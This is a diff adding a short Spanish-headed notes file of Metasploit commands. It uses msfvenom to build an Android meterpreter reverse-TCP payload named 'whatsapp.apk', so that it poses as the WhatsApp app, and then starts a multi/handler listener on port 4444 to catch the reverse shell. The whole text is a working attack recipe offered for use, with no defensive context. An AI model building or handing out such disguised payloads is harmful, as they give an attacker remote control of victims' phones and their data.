@@ -1,0 +1,11 @@
+crear apk
+msfvenom -p android/meterpreter/reverse_tcp LHOST= LPORT= -o whatsapp.apk
+
+msfconsole
+
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set lhost 0.0.0.0
+set lport 4444
+run
+
